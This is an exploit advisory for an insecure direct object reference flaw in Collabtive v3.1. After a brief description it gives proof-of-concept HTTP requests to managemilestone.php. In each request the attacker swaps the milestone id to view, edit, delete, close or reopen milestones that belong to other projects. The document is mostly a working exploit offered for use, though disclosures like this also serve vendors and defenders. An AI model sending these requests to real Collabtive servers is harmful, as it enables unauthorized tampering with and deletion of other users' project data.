# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view/update/delete/close/open the milestone that belongs to other project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /managemilestone.php?action=editform&mid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
POST /managemilestone.php?action=edit&id=1 HTTP/1.1
...

name=ms1&desc=lllllllll1111&start=05.10.2023&end=31.10.2023&mid=1(CHANGE HERE)
```

```
GET /managemilestone.php?action=del&mid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
GET /managemilestone.php?action=close&mid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
GET /managemilestone.php?action=open&mid=1(CHANGE HERE)&id=1 HTTP/1.1
```